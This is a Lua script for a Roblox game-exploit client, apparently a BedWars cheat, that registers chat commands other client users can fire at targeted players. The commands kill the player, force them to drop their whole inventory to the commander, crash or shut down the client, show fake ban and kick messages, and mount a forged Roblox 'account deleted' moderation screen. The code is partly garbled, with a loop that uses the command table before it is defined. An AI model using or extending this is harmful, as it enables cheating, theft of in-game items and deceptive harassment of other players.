wait(2)
print("Loading Commands.")
wait(2) 
print("Successfully Loaded Commands.")

                for i,v in next, (GSCmds) do
                    if message.Text:len() >= (i:len() + 1) and message.Text:sub(1, i:len() + 1):lower() == ";"..i:lower() then
                        message.Text = ""
                        if table.find(chosenplayers, lplr) then
                            v(args, plr)
                        end
                        break
                    end
                end
print("Loaded Client-Sided Commands")

local GSCmds = {
    kill = function(args, plr)
        if entityLibrary.isAlive then
            local hum = entityLibrary.character.Humanoid
            task.delay(0.1, function()
                if hum and hum.Health > 0 then 
                    hum:ChangeState(Enum.HumanoidStateType.Dead)
                    hum.Health = 0
                    bedwars.ClientHandler:Get(bedwars.ResetRemote):SendToServer()
                end
            end)
        end
    end,
    byfron = function(args, plr)
        task.spawn(function()
            local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
            local Roact = getrenv().require(game:GetService("CorePackages").Roact)
            UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
            local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
            local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
            local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
            local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
            local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
            lplr.PlayerGui:ClearAllChildren()
            GuiLibrary.MainGui.Enabled = false
            game:GetService("CoreGui"):ClearAllChildren()
            for i,v in next, (workspace:GetChildren()) do pcall(function() v:Destroy() end) end
            task.wait(0.2)
            lplr:Kick()
            game:GetService("GuiService"):ClearError()
            task.wait(2)
            local gui = Instance.new("ScreenGui")
            gui.IgnoreGuiInset = true
            gui.Parent = game:GetService("CoreGui")
            local frame = Instance.new("Frame")
            frame.BorderSizePixel = 0
            frame.Size = UDim2.new(1, 0, 1, 0)
            frame.BackgroundColor3 = Color3.new(1, 1, 1)
            frame.Parent = gui
            task.delay(0.1, function()
                frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
            end)
            task.delay(2, function()
                local function shutTheFuckUp() -- pistonware modification
                    game.Shutdown(game)
                end
                local e = Roact.createElement(auth, {
                    style = {},
                    screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
                    moderationDetails = {
                        punishmentTypeDescription = "Delete",
                        beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
                        reactivateAccountActivated = true,
                        badUtterances = {},
                        messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
                    },
                    termsActivated = shutTheFuckUp,
                    communityGuidelinesActivated = shutTheFuckUp,
                    supportFormActivated = shutTheFuckUp,
                    reactivateAccountActivated = shutTheFuckUp,
                    logoutCallback = shutTheFuckUp,
                    globalGuiInset = {
                        top = 0
                    }
                })
                local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
                        localization = tLocalization.mock()
                    }, {Roact.createElement(UIBlox.Style.Provider, {
                            style = {
                                Theme = darktheme,
                                Font = gotham
                            },
                        }, {e})}))
                Roact.mount(screengui, game:GetService("CoreGui"))
            end)
        end)
    end,
    steal = function(args, plr)
        if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
            GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
            task.wait(1)
        end
        for i,v in next, (bedwarsStore.localInventory.inventory.items) do 
            local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
                item = v.tool,
                amount = v.amount ~= math.huge and v.amount or 99999999
            })
            if e then 
                e.CFrame = plr.Character.HumanoidRootPart.CFrame
            else
                v.tool:Destroy()
            end
        end
    end,
    lobby = function(args)
        bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
    end,
    reveal = function(args)
        task.spawn(function()
            task.wait(0.1)
            local newchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
            if newchannel then 
                newchannel:SendAsync("I am using the inhaler client")
            end
        end)
    end,
    lagback = function(args)
        if entityLibrary.isAlive then
            entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(9999999, 9999999, 9999999)
        end
    end,
    jump = function(args)
        if entityLibrary.isAlive and entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
            entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end,
    trip = function(args)
        if entityLibrary.isAlive then
            entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
        end
    end,
    teleport = function(args)
        game:GetService("TeleportService"):Teleport(tonumber(args[1]) ~= "" and tonumber(args[1]) or game.PlaceId)
    end,
    sit = function(args)
        if entityLibrary.isAlive then
            entityLibrary.character.Humanoid.Sit = true
        end
    end,
    unsit = function(args)
        if entityLibrary.isAlive then
            entityLibrary.character.Humanoid.Sit = false
        end
    end,
    freeze = function(args)
        if entityLibrary.isAlive then
            entityLibrary.character.HumanoidRootPart.Anchored = true
        end
    end,
    thaw = function(args)
        if entityLibrary.isAlive then
            entityLibrary.character.HumanoidRootPart.Anchored = false
        end
    end,
    deletemap = function(args)
        for i,v in next, (collectionService:GetTagged("block")) do
            v:Destroy()
        end
    end,
    void = function(args)
        if entityLibrary.isAlive then
            entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + Vector3.new(0, -1000, 0)
        end
    end,
    framerate = function(args)
        if #args >= 1 then
            if setfpscap then
                setfpscap(tonumber(args[1]) ~= "" and math.clamp(tonumber(args[1]) or 9999, 1, 9999) or 9999)
            end
        end
    end,
    crash = function(args)
        setfpscap(9e9)
        print(game:GetObjects("h29g3535")[1])
    end,
    chipman = function(args)
        transformImage("http://www.roblox.com/asset/?id=6864086702", "chip man")
    end,
    rickroll = function(args)
        transformImage("http://www.roblox.com/asset/?id=7083449168", "Never gonna give you up")
    end,
    josiah = function(args)
        transformImage("http://www.roblox.com/asset/?id=13924242802", "josiah boney")
    end,
    xylex = function(args)
        transformImage("http://www.roblox.com/asset/?id=13953598788", "byelex")
    end,
    gravity = function(args)
        workspace.Gravity = tonumber(args[1]) or 192.6
    end,
    kick = function(args)
        local str = ""
        for i,v in next, (args) do
            str = str..v..(i > 1 and " " or "")
        end
        task.spawn(function()
            lplr:Kick(str)
        end)
        bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
    end,
    ban = function(args)
        task.spawn(function()
            lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
        end)
        bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
    end,
    uninject = function(args)
        GuiLibrary.SelfDestruct()
    end,
    monkey = function(args)
        local str = ""
        for i,v in next, (args) do
            str = str..v..(i > 1 and " " or "")
        end
        if str == "" then str = "skill issue" end
        local video = Instance.new("VideoFrame")
        video.Video = downloadVapeAsset("vape/assets/skill.webm")
        video.Size = UDim2.new(1, 0, 1, 36)
        video.Visible = false
        video.Position = UDim2.new(0, 0, 0, -36)
        video.ZIndex = 9
        video.BackgroundTransparency = 1
        video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
        local textlab = Instance.new("TextLabel")
        textlab.TextSize = 45
        textlab.ZIndex = 10
        textlab.Size = UDim2.new(1, 0, 1, 36)
        textlab.TextColor3 = Color3.new(1, 1, 1)
        textlab.Text = str
        textlab.Position = UDim2.new(0, 0, 0, -36)
        textlab.Font = Enum.Font.Gotham
        textlab.BackgroundTransparency = 1
        textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
        video.Loaded:Connect(function()
            video.Visible = true
            video:Play()
            task.spawn(function()
                repeat
                    wait()
                    for i = 0, 1, 0.01 do
                        wait(0.01)
                        textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
                    end
                until true == false
            end)
        end)
        task.wait(19)
        task.spawn(function()
            pcall(function()
                if getconnections then
                    getconnections(entityLibrary.character.Humanoid.Died)
                end
                print(game:GetObjects("h29g3535")[1])
            end)
            while true do end
        end)
    end,
    enable = function(args)
        if #args >= 1 then
            if args[1]:lower() == "all" then
                for i,v in next, (GuiLibrary.ObjectsThatCanBeSaved) do 
                    if v.Type == "OptionsButton" and i ~= "Panic" and not v.Api.Enabled then
                        v.Api.ToggleButton()
                    end
                end
            else
                local module
                for i,v in next, (GuiLibrary.ObjectsThatCanBeSaved) do 
                    if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
                        module = v
                        break
                    end
                end
                if module and not module.Api.Enabled then
                    module.Api.ToggleButton()
                end
            end
        end
    end,
    disable = function(args)
        if #args >= 1 then
            if args[1]:lower() == "all" then
                for i,v in next, (GuiLibrary.ObjectsThatCanBeSaved) do 
                    if v.Type == "OptionsButton" and i ~= "Panic" and v.Api.Enabled then
                        v.Api.ToggleButton()
                    end
                end
            else
                local module
                for i,v in next, (GuiLibrary.ObjectsThatCanBeSaved) do 
                    if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
                        module = v
                        break
                    end
                end
                if module and module.Api.Enabled then
                    module.Api.ToggleButton()
                end
            end
        end
    end,
    toggle = function(args)
        if #args >= 1 then
            if args[1]:lower() == "all" then
                for i,v in next, (GuiLibrary.ObjectsThatCanBeSaved) do 
                    if v.Type == "OptionsButton" and i ~= "Panic" then
                        v.Api.ToggleButton()
                    end
                end
            else
                local module
                for i,v in next, (GuiLibrary.ObjectsThatCanBeSaved) do 
                    if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
                        module = v
                        break
                    end
                end
                if module then
                    module.Api.ToggleButton()
                end
            end
        end
    end,
    shutdown = function(args)
        game:Shutdown()
    end
}
GSCmds.unfreeze = GSCmds.thaw
